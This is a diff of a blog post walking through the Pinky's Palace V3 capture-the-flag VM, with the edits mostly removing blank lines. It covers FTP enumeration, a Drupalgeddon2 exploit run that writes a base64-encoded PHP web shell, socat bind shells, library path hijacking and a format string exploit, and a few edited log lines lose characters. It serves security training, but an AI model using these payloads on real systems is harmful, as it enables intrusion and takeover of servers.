@@ -3,9 +3,7 @@ published: false
 ---
 It has been a while since we posted. We have not stopped, but rather moved away from Twitch and over to [youtube](https://www.youtube.com/channel/UCBE5zF0VuDwn2-cAMNBJvkA)! 
 
-
 This one took us a while to complete and was split over a series of four videos. Let's dive in.
-
 
 Back to CTF’s this ~week~ month we are working on Pinky’s Palace V3! We have completed v2 in a previous stream and looking forward to what this one has in store.
 
@@ -17,87 +15,45 @@ Back to CTF’s this ~week~ month we are working on Pinky’s Palace V3! We have
 Starting off as we always do with an nmap scan:
 
 ```
-
 root@kali: nmap -sC -sV -oN nmap 192.168.1.148
-
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-26 08:52 AEST
-
 Nmap scan report for 192.168.1.148
-
 Host is up (0.000087s latency).
-
 Not shown: 997 closed ports
-
 PORT     STATE SERVICE VERSION
-
 21/tcp   open  ftp     vsftpd 2.0.8 or later
-
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
-
 |_-rw-r--r--    1 0        0             173 May 14  2018 WELCOME
-
 | ftp-syst: 
-
 |   STAT: 
-
 | FTP server status:
-
 |      Connected to ::ffff:192.168.1.158
-
 |      Logged in as ftp
-
 |      TYPE: ASCII
-
 |      No session bandwidth limit
-
 |      Session timeout in seconds is 300
-
 |      Control connection is plain text
-
 |      Data connections will be plain text
-
 |      At session startup, client count was 3
-
 |      vsFTPd 3.0.3 - secure, fast, stable
-
 |_End of status
-
 5555/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
-
 | ssh-hostkey: 
-
 |   2048 80:52:6e:bd:b0:c4:be:0a:f2:1d:3b:ac:b8:47:4f:ee (RSA)
-
 |   256 eb:c8:76:a4:cf:37:6f:0d:5f:f5:48:af:5c:29:92:d9 (ECDSA)
-
 |_  256 48:2b:84:02:3e:87:7b:2a:f3:91:11:31:0f:98:11:c7 (ED25519)
-
 8000/tcp open  http    nginx 1.10.3
-
 |_http-generator: Drupal 7 (http://drupal.org)
-
 | http-robots.txt: 36 disallowed entries (15 shown)
-
 | /includes/ /misc/ /modules/ /profiles/ /scripts/ 
-
 | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
-
 | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
-
 |_/LICENSE.txt /MAINTAINERS.txt
-
 |_http-server-header: nginx/1.10.3
-
 |_http-title: PinkDrup
-
 MAC Address: 00:0C:29:DE:0C:29 (VMware)
-
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-​
-
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 Nmap done: 1 IP address (1 host up) scanned in 12.68 seconds
 
 ```
@@ -111,77 +67,41 @@ We should know just from looking at those results that the Drupal site should be
 ```
 
 root@kali: ftp 192.168.1.148
-
 Connected to 192.168.1.148.
-
 220 Pinky's FTP
-
 Name (192.168.1.148:root): anonymous
-
 331 Please specify the password.
-
 Password:
-
 230 Login successful.
-
 Remote system type is UNIX.
-
 Using binary mode to transfer files.
-
 ftp> ls -al
-
 200 PORT command successful. Consider using PASV.
-
 ftp> exit
-
 root@kali: ftp -p 192.168.1.148
-
 Connected to 192.168.1.148.
-
 220 Pinky's FTP
-
 Name (192.168.1.148:root): anonymous
-
 331 Please specify the password.
-
 Password:
-
 230 Login successful.
-
 Remote system type is UNIX.
-
 Using binary mode to transfer files.
-
 ftp> ls -al
-
 227 Entering Passive Mode (192,168,1,148,29,32).
-
 150 Here comes the directory listing.
-
 drwxr-xr-x    3 0        111          4096 May 14  2018 .
-
 drwxr-xr-x    3 0        111          4096 May 14  2018 ..
-
 drwxr-xr-x    3 0        0            4096 May 14  2018 ...
-
 -rw-r--r--    1 0        0             173 May 14  2018 WELCOME
-
 226 Directory send OK.
-
 ftp> get WELCOME
-
 local: WELCOME remote: WELCOME
-
 227 Entering Passive Mode (192,168,1,148,69,32).
-
 150 Opening BINARY mode data connection for WELCOME (173 bytes).
-
 226 Transfer complete.
-
 173 bytes received in 0.00 secs (396.5852 kB/s)
-
 ftp> 
-
 ```
 
 We have spoken in the past about the differences between passive and active. We notice initially that running commands in active (default) don’t work very well so we reconnect in passive mode.
@@ -190,53 +110,29 @@ We have spoken in the past about the differences between passive and active. We 
 We then pull the `WELCOME` file but also notice that there is a sneaky `…` folder that is not a default thing. So we head in there to see whats going on.
 
 ```
-
 ftp> cd ...
-
 250 Directory successfully changed.
-
 ftp> ls -al
-
 227 Entering Passive Mode (192,168,1,148,39,11).
-
 150 Here comes the directory listing.
-
 drwxr-xr-x    3 0        0            4096 May 14  2018 .
-
 drwxr-xr-x    3 0        111          4096 May 14  2018 ..
-
 drwxr-xr-x    2 0        0            4096 May 15  2018 .bak
-
 226 Directory send OK.
-
 ftp> cd .bak
-
 250 Directory successfully changed.
-
 ftp> ls -al
-
 227 Entering Passive Mode (192,168,1,148,113,190).
-
 150 Here comes the directory listing.
-
 drwxr-xr-x    2 0        0            4096 May 15  2018 .
-
 drwxr-xr-x    3 0        0            4096 May 14  2018 ..
-
 -rwxr--r--    1 0        0             190 May 15  2018 firewall.sh
-
 226 Directory send OK.
-
 ftp> get firewall.sh
-
 local: firewall.sh remote: firewall.sh
-
 227 Entering Passive Mode (192,168,1,148,226,128).
-
 150 Opening BINARY mode data connection for firewall.sh (190 bytes).
-
 226 Transfer complete.
-
 190 bytes received in 0.00 secs (388.9872 kB/s)
 
 ```
@@ -248,19 +144,13 @@ In the `…` folder we have another hidden folder called `.bak` and in there we 
 Taking a look. We see what we expected from the WELCOME file.
 
 ```
-
 root@kali: cat WELCOME
-
 Welcome to Pinky's Palace V3
-
 
 Good Luck ;}
 
-
 I encourage you to be creative, try and stay away from metasploit and pre-made tools.
-
 You will learn much more this way!
-
 
 ~Pinky
 
@@ -271,16 +161,11 @@ You will learn much more this way!
 Then in our firewall file we have:
 
 ```
-
 root@kali: cat firewall.sh 
-
 #!/bin/bash
-
 #FIREWALL
 
-
 iptables -A OUTPUT -o eth0 -p tcp --tcp-flags ALL SYN -m state --state NEW -j DROP
-
 ip6tables -A OUTPUT -o eth0 -p tcp --tcp-flags ALL SYN -m state --state NEW -j DROP
 
 ```
@@ -303,12 +188,10 @@ Looks like that’s it from the FTP. So time to dive into the fun stuff.
 
 Browsing to the site we get a standard Drupal site and the `CANGELOG.txt` file confirms that it is an older version of Drupal we know is vulnerable to Drupalgeddon.
 
-
 ![331218961.png]({{site.baseurl}}/Images/pp3/331218961.png)
 
 
 CHANGELOG.txt:
-
 
 ![331186195.png]({{site.baseurl}}/Images/pp3/331186195.png)
 
@@ -316,34 +199,21 @@ CHANGELOG.txt:
 Droopescan doesn’t reveal much we didn’t already know:
 
 ```
-
 root@kali: droopescan scan drupal -u 192.168.1.148:8000
-
 [+] Themes found:                                                               
-
     seven http://192.168.1.148:8000/themes/seven/
-
     garland http://192.168.1.148:8000/themes/garland/
 
-
 [+] Possible interesting urls found:
-
     Default changelog file - http://192.168.1.148:8000/CHANGELOG.txt
-
-
+    
 [+] Possible version(s):
-
     7.57
 
-
 [+] Plugins found:
-
     image http://192.168.1.148:8000/modules/image/
-
     profile http://192.168.1.148:8000/modules/profile/
-
     php http://192.168.1.148:8000/modules/php/
-
 ```
 
 
@@ -463,154 +333,81 @@ Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)
 
 These are both for the drupalgeddon2 vulnerability, which allow bash command injection from an un-authenticated context, however the Python PoC doesn’t work on our specific version of Drupal. Pulling apart the ruby version it appears there are a number of checks made to understand the specific vulnerability that will be used to gain execution. We did have plans to re-implement this, however given time (and laziness) we didn’t. This script does 3 key things though:
 
-
 1. Find out exactly how the specific instance of drupal is vulnerable, and test it.
-
 2. Execute the vulnerability, placing a PHP reverse shell on the server.
-
 3. Connect to the PHP reverse shell and provide a helpful wrapper around it’s use.
-
 
 So if we run our script:
 
 ```
-
 kali :: /data/CTFs/pinkys3 # ruby 44449.rb http://10.10.0.17:8000/ --verbose                                                           
-
 ruby: warning: shebang line ending with \r may cause problems
-
 [*] --==[::#Drupalggedon2::]==--
-
 --------------------------------------------------------------------------------
-
 [i] Target : http://10.10.0.17:8000/
-
 --------------------------------------------------------------------------------
-
 [v] HTTP - URL : http://10.10.0.17:8000/CHANGELOG.txt
-
 [v] HTTP - Type: get
-
 [+] Found  : http://10.10.0.17:8000/CHANGELOG.txt    (HTTP Response: 200)    [HTTP Size: 8]
-
 [+] Drupal!: v7.57
-
 --------------------------------------------------------------------------------
-
-[*] Testing: Form   (user/password)
-
+[*] Testing: Form   (user/password
 [v] HTTP - URL : http://10.10.0.17:8000/?q=user/password
-
 [v] HTTP - Type: get
-
 [+] Result : Form valid
-
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-
 [*] Testing: Clean URLs
-
 [v] HTTP - URL : http://10.10.0.17:8000/user/password
-
 [v] HTTP - Type: get
-
 [!] Result : Clean URLs disabled (HTTP Response: 404)
-
 [v] response.body: <html>
-
 <head><title>404 Not Found</title></head>
-
 <body bgcolor="white">
-
 <center><h1>404 Not Found</h1></center>
-
 <hr><center>nginx/1.10.3</center>
-
 </body>
-
 </html>
-
 [i] Isn't an issue for Drupal v7.x
-
 --------------------------------------------------------------------------------
-
 [*] Testing: Code Execution   (Method: name)
-
 [i] Payload: echo RLGICINN
-
 [v] Element    : name
-
 [v] PHP fn     : passthru
-
 [v] HTTP - URL : http://10.10.0.17:8000/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo RLGICINN
-
 [v] HTTP - Type: post
-
 [v] HTTP - Data: form_id=user_pass&_triggering_element_name=name
-
 [v] Form name  : form_build_id
-
 [v] Form value : form-Z4FbKXMVLl6eLy0FH6ngnR5lA-nQMVTMN-uJFrVIe7g
-
 [v] HTTP - URL : http://10.10.0.17:8000/?q=file/ajax/name/%23value/form-Z4FbKXMVLl6eLy0FH6ngnR5lA-nQMVTMN-uJFrVIe7g
-
 [v] HTTP - Type: post
-
 [v] HTTP - Data: form_build_id=form-Z4FbKXMVLl6eLy0FH6ngnR5lA-nQMVTMN-uJFrVIe7g
-
 [+] Result : RLGICINN
-
 [+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
-
 --------------------------------------------------------------------------------
-
 [*] Testing: Existing file   (http://10.10.0.17:8000/shell.php)
-
 [v] HTTP - URL : http://10.10.0.17:8000/shell.php
-
 [v] HTTP - Type: get
-
 [!] Response: HTTP 200 // Size: 5.   ***Something could already be there?***
-
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-
 [*] Testing: Writing To Web Root   (./)
-
 [i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
-
 [v] Element    : name
-
 [v] PHP fn     : passthru
-
 [v] HTTP - URL : http://10.10.0.17:8000/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
-
 [v] HTTP - Type: post
-
 [v] HTTP - Data: form_id=user_pass&_triggering_element_name=name
-
 [v] Form name  : form_build_id
-
 [v] Form value : form-WS9tBwvMT7Y_KrfrAV5CfV1pymCuRsI9xHyQkZX1KGk
-
-[v] HTTP - URL : http://10.10.0.17:8000/?q=file/ajax/name/%23value/form-WS9tBwvMT7Y_KrfrAV5CfV1pymCuRsI9xHyQkZX1KGk
-
+[v] HTTP - URL : http://10.10.0.17:8000/?qfile/ajax/name/%23value/form-WS9tBwvMT7Y_KrfrAV5CfV1pymCuRsI9xHyQkZX1KGk
 [v] HTTP - Type: post
-
 [v] HTTP - Data: form_build_id=form-WS9tBwvMT7Y_KrfrAV5CfV1pymCuRsI9xHyQkZX1KGk
-
 [+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
-
 [v] HTTP - URL : http://10.10.0.17:8000/shell.php
-
 [v] HTTP - Type: post
-
 [v] HTTP - Data: c=hostname
-
 [+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
-
 --------------------------------------------------------------------------------
-
 [i] Fake PHP shell:   curl 'http://10.10.0.17:8000/shell.php' -d 'c=hostname'
-
 ```
 
 
@@ -632,19 +429,14 @@ A bind shell is effectively no different from SSH or Telnet. You connect to the 
 There are a few options, however one of the limiting factors is the timeout of the shell. Installed on the server is `socat`, `python`, `perl` and `php`. All things we can use for bind shells. We chose `socat`, a tool that is similar to netcat in operation. A first attempt at using socat looks like this:
 
 ```
-
 Run on the server (in the fake shell provided by the script):
-
 nohup socat TCP-LISTEN:1337 EXEC:/bin/bash
-
 Run on the client:
-
 nc <server IP> 1337
 
 ```
 
 You will find that gets you a shell, but you need to upgrade it with `python -c 'import pty;pty.spawn("/bin/bash”)'`
-
 
 Note that on the server (using the fake shell) we have to use `nohup`. nohup is a simple utility that prevents processes from closing when a terminal ends. Our PHP reverse shell will sit there for ~30 seconds before timing out, so without nohup all your shells only last 30 seconds, however it does leave nohup.out files on the file system, where shell output is written.
 
@@ -654,11 +446,9 @@ A better alternative is to use some extra arguments in socat:
 ```
 
 Server:
-
 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 
 Client:
-
 socat FILE:`tty`,raw,echo=0 TCP:<server IP>:1337
 
 ```
@@ -672,18 +462,14 @@ Let’s break this down:
 
 `TCP-LISTEN:4444` - Simply telling socat to listen on port 1337 and wait for an incoming connection.
 
-
 `reuseaddr` - Allows other sockets to bind to an address even if parts of it (e.g. the local port) are already in use by socat
 
-
 `fork` - This is what gives us the stable shell. After establishing a connection, socat handles its channel in a child process. This child process is no longer limited to the 30 sec web timeout.
-
 
 `EXEC:…` - Binds the binaries to the channel so that they are executed when a connection is made. This is what gives us our shell on connection. But it could just as easily run a script or perform a task without us getting a response. For example `EXEC:'echo hello /tmp/test.txt'`
 
 
 Then from the attacker side:
-
 
 `FILE:`tty`,raw,echo=0` - The socat way of upgrading the shell to a fully interactive one passing through our sigints etc. allowing us to up arrow through command history, and ctrl+c etc without killing the shell.
 
@@ -697,107 +483,58 @@ We are now the www-data user on the server, yay!
 Poking around, we see that there are a few different users on the box:
 
 ```
-
 www-data@pinkys-palace:~/html$ cat /etc/passwd
-
 root:x:0:0:root:/root:/bin/bash
-
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
-
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
-
 sync:x:4:65534:sync:/bin:/bin/sync
-
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
-
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-
 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-
 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-
 list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-
 irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-
 gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-
 systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
-
 systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
-
 systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-
 systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
-
 _apt:x:104:65534::/nonexistent:/bin/false
-
 messagebus:x:105:109::/var/run/dbus:/bin/false
-
 pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
-
 sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
-
 ftp:x:107:111:ftp daemon,,,:/srv/ftp:/bin/false
-
 mysql:x:108:113:MySQL Server,,,:/nonexistent:/bin/false
-
 pinksec:x:1001:1001::/home/pinksec:/bin/bash
-
 pinksecmanagement:x:1002:1002::/home/pinksecmanagement:/bin/bash
-
 www-data@pinkys-palace:~/html$ 
-
 ```
 
 When we look at what is listening and running on the box we find what might be our next path forward:
 
 ```
-
 www-data@pinkys-palace:~/html$ netstat -tunlp
-
 (Not all processes could be identified, non-owned process info
-
  will not be shown, you would have to be root to see it all.)
-
 Active Internet connections (only servers)
-
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name   
 tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
-
 tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -                   
-
 tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      -                   
-
 tcp        0      0 127.0.0.1:65334         0.0.0.0:*               LISTEN      -                   
-
 tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      911/socat           
-
 tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      515/nginx: worker p 
-
 tcp6       0      0 :::80                   :::*                    LISTEN      515/nginx: worker p 
-
 tcp6       0      0 :::5555                 :::*                    LISTEN      -                   
-
 tcp6       0      0 :::21                   :::*                    LISTEN      -                   
-
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
-
 ```
 
 
@@ -816,276 +553,147 @@ Port 65334 is an unknown. Something is running on that port, but it could be any
 Moving to our processes. We know that 80 is a web server, but we don’t know who is running it. Luckily there are ways to find out:
 
 ```
-
 www-data@pinkys-palace:~/html$ ps -auxw
-
 USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-
 root         1  0.2  0.2  26912  6104 ?        Ss   00:08   0:01 /sbin/init
-
 root         2  0.0  0.0      0     0 ?        S    00:08   0:00 [kthreadd]
-
 root         3  0.0  0.0      0     0 ?        S    00:08   0:00 [ksoftirqd/0]
-
 ...
-
 root       441  0.0  0.0   7068  1904 ?        Ss   00:08   0:00 /lib/systemd/systemd-logind
-
 message+   442  0.0  0.1   6256  3760 ?        Ss   00:08   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfi
-
 root       503  0.0  1.4 139496 29012 ?        Ss   00:08   0:00 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
-
 root       506  0.0  0.1   5872  2284 ?        Ss   00:08   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
-
 root       510  0.0  0.0   4404  1652 tty1     Ss+  00:08   0:00 /sbin/agetty --noclear tty1 linux
-
 root       514  0.0  0.0  48296  1180 ?        Ss   00:08   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process 
-
 www-data   515  0.0  0.1  48500  3384 ?        S    00:08   0:00 nginx: worker process
-
 www-data   516  0.0  0.1  48500  2464 ?        S    00:08   0:00 nginx: worker process
-
 root       533  0.0  0.2  10468  5116 ?        Ss   00:08   0:00 /usr/sbin/sshd -D
-
 www-data   589  0.0  0.9 140004 19516 ?        S    00:08   0:00 php-fpm: pool www
-
 www-data   590  0.0  0.9 140004 20424 ?        S    00:08   0:00 php-fpm: pool www
-
-root       593  0.0  0.0   8108   712 ?        Ss   00:08   0:00 /sbin/dhclient -4 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/d
-
+root       593  0.0  0.0   8108   712 ?       Ss   00:08   0:00 /sbin/dhclient -4 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/d
 root       634  0.0  1.4 139300 29024 ?        Ss   00:08   0:00 /usr/sbin/apache2 -k start
-
 pinksec    708  0.0  0.3 139324  6244 ?        S    00:08   0:00 /usr/sbin/apache2 -k start
-
 pinksec    709  0.0  0.3 139324  6244 ?        S    00:08   0:00 /usr/sbin/apache2 -k start
-
 pinksec    710  0.0  0.3 139324  6244 ?        S    00:08   0:00 /usr/sbin/apache2 -k start
-
 pinksec    711  0.0  0.3 139324  6244 ?        S    00:08   0:00 /usr/sbin/apache2 -k start
-
 pinksec    712  0.0  0.3 139324  6244 ?        S    00:08   0:00 /usr/sbin/apache2 -k start
-
 mysql      722  0.2  3.6 626104 75264 ?        Ssl  00:08   0:01 /usr/sbin/mysqld
-
 www-data   910  0.0  0.0   2328   604 ?        S    00:09   0:00 sh -c socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,set
-
 www-data   911  0.0  0.0   6060  1452 ?        S    00:09   0:00 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,si
-
-www-data   912  0.0  0.1   6228  2276 ?        R    00:10   0:00 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,si
-
+www-data   912  0.0  0.1   6228  2276 ?        R    00:1   0:00 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,si
 www-data   913  0.0  0.1   3968  3192 pts/0    Ss   00:10   0:00 bash
-
 root       916  0.0  0.0      0     0 ?        S    00:13   0:00 [kworker/0:0]
-
 www-data   917  0.0  0.1   5988  2856 pts/0    R+   00:16   0:00 ps -auxw
-
 ```
 
 
 We know that www-data is the user running the nginx server on port 8000 out of the /var/www/html folder, but this command shows us that the pinksec user is running an apache2 server. Apache uses VirtualHosts to run multiple websites on the same server, let’s go and look at the apache config and figure out where this site is being hosted from.
 
 ```
-
 www-data@pinkys-palace:/etc/apache2/sites-available$ cat 000-default.conf 
-
 <VirtualHost 127.0.0.1:80>
-
         # The ServerName directive sets the request scheme, hostname and port that
-
         # the server uses to identify itself. This is used when creating
-
         # redirection URLs. In the context of virtual hosts, the ServerName
-
         # specifies what hostname must appear in the request's Host: header to
-
         # match this virtual host. For the default virtual host (this file) this
-
         # value is not decisive as it is used as a last resort host regardless.
-
         # However, you must set it for any further virtual host explicitly.
-
         #ServerName www.example.com
 
-
         ServerAdmin pinkyadmin@localhost
-
         DocumentRoot /home/pinksec/html
-
         <Directory "/home/pinksec/html">
-
         Order allow,deny
-
         Allow from all
-
         Require all granted
-
         </Directory>
-
         # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
-
         # error, crit, alert, emerg.
-
         # It is also possible to configure the loglevel for particular
-
         # modules, e.g.
-
         #LogLevel info ssl:warn
-
-
         ErrorLog ${APACHE_LOG_DIR}/error.log
-
         CustomLog ${APACHE_LOG_DIR}/access.log combined
 
-
         # For most configuration files from conf-available/, which are
-
         # enabled or disabled at a global level, it is possible to
-
         # include a line for only one particular virtual host. For example the
-
         # following line enables the CGI configuration for this host only
-
         # after it has been globally disabled with "a2disconf".
-
         #Include conf-available/serve-cgi-bin.conf
-
 </VirtualHost>
-
 <VirtualHost 127.0.0.1:65334>
-
         DocumentRoot /home/pinksec/database
-
         ServerAdmin pinkyadmin@localhost
-
         <Directory "/home/pinksec/database">
-
         Order allow,deny
-
         Allow from all
-
         Require all granted
-
         </Directory>
-
 </VirtualHost>
-
 # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
-
 ```
 
 
 We get a double whammy in the default apache config file. We can see from this that there is a website running on port 80 from the `/home/pinksec/html` folder. We also can see that the port 65334 is another website running out of the `/home/pinksec/database` folder. Neither of which we have access to as www-data.
 
-
 If we wanted to be masochist’s we could sit here and wget/curl everything locally from our shell:
 
 ```
-
 www-data@pinkys-palace:/tmp$ wget 127.0.0.1:80
-
 --2020-02-03 00:27:04--  http://127.0.0.1/
-
 Connecting to 127.0.0.1:80... connected.
-
 HTTP request sent, awaiting response... 200 OK
-
 Length: 820 [text/html]
-
 Saving to: 'index.html'
 
-
 index.html          100%[===================>]     820  --.-KB/s    in 0s      
-
-
 2020-02-03 00:27:04 (251 MB/s) - 'index.html' saved [820/820]
 
-
 www-data@pinkys-palace:/tmp$ cat index.html 
-
 <html>
-
         <head>
-
                 <title>PinkSec</title>
-
         </head>
-
         <body>
-
                 <div class="d1">
-
                         <center><h1>PinkSec Control Panel</h1></center>
-
                         <center><h3>Under Development</h3></center>
-
                 </div>
-
                 <div class="d2">
-
                         <center><h2>Login</h2></center>
-
                         <center><form action="login.php" method="post">
-
                                 Username:
-
                                 <input type="text" name="user"/>
-
                                 <br>Password:
-
                                 <input type="password" name="pass"/>
-
                                 <br>5-Digit-Pin:
-
                                 <input type="password" name="pin"/>
-
                                 <br>
-
                                 <input type="submit" value="[===== Login To Control Panel =====]"/>
-
                                 <br>
-
                                 </form></center>
-
                 </div>
-
         </body>
-
         <style>
-
                 html{
-
                         background-color: #000000
-
                 }
-
                 div.d1{
-
                         background-color: #ff33cc;
-
                 }
-
                 div.d2{
-
                         background-color: #ff33cc;
-
                 }
-
                 form{
-
                         text-align: left;
-
                 }
-
                 input{
-
                         background-color: #ff33cc;
-
                 }
-
         </style>
-
 </html>
-
 ```
 
 
@@ -1554,57 +1162,32 @@ Options 1. and 2. might not work for us, as they need to be exploited at link an
 
 First we need to do a little bit of prep work so that we can confirm our exploit and hijack of the library path has worked. We use the tool ldd against pinksecd to see where the current library is being loaded from as well as any current values for the environment variables, and if we are able to set the value to something custom, we also look at the existing ldd config to see if there are any other folders we can upload our exploit library to.
 
-
-```pinksec@pinkys-palace:/home/pinksec$ echo $LD_RUN_PATH
-
+```
+pinksec@pinkys-palace:/home/pinksec$ echo $LD_RUN_PATH
 pinksec@pinkys-palace:/home/pinksec$ echo $LD_LIBRARY_PATH
-
 pinksec@pinkys-palace:/home/pinksec$ echo $DT_RUN_PATH
-
 pinksec@pinkys-palace:/home/pinksec$ export LD_LIBRARY_PATH=/those/guys
-
 pinksec@pinkys-palace:/home/pinksec$ echo $LD_LIBRARY_PATH
-
 /those/guys
-
 pinksec@pinkys-palace:/home/pinksec$ ls -la /etc/ld.so.conf.d/
-
 total 20
-
 drwxr-xr-x  2 root root 4096 May 14  2018 .
-
 drwxr-xr-x 81 root root 4096 Feb  5 23:46 ..
-
 -rw-r--r--  1 root root   36 Jan 16  2017 fakeroot-i386-linux-gnu.conf
-
 -rw-r--r--  1 root root  108 Jan 14  2018 i386-linux-gnu.conf
-
 -rw-r--r--  1 root root   44 Mar 20  2016 libc.conf
-
 pinksec@pinkys-palace:/home/pinksec$ cat /etc/ld.so.conf.d/i386-linux-gnu.conf         
-
 # Multiarch support
-
 /lib/i386-linux-gnu
-
 /usr/lib/i386-linux-gnu
-
 /lib/i686-linux-gnu
-
 /usr/lib/i686-linux-gnu
-
 pinksec@pinkys-palace:/home/pinksec$ cat /etc/ld.so.conf.d/fakeroot-i386-linux-gnu.conf                         
-
 /usr/lib/i386-linux-gnu/libfakeroot
-
 pinksec@pinkys-palace:/home/pinksec$ cat /etc/ld.so.conf.d/libc.conf        
-
 # libc default configuration
-
 /usr/local/lib
-
 pinksec@pinkys-palace:/home/pinksec$ cat /etc/ld.so.conf             
-
 include /etc/ld.so.conf.d/*.conf
 ```
 
@@ -1740,9 +1323,7 @@ We try the same code again, this time with `/bin/sh` instead and this time we in
 
 ```
 pinksec@pinkys-palace:/home/pinksec/bin$ ./pinksecd -d                     
-
 $ whoami
-
 pinksecmanagement
 ```
 
@@ -1997,12 +1578,10 @@ The cracks in the "intro to format string exploits" tutorial we were following s
 /usr/local/bin/PSMCCLI 'AAAABBBBCC%135$0x%136$0x'
 ```
 
-
 To make it easier for later when we need to write bytes, we use python to print the characters:
 ```
 /usr/local/bin/PSMCCLI $(python -c 'import sys; sys.stdout.write("AAAABBBBCC%135$0x%136$0x")')
 ```
-
 
 So now that we know we can control some memory addresses, we need to find somewhere in the application that will perform a `JMP`. If we can control the value at this location, we can redirect application flow to our shellcode.
 
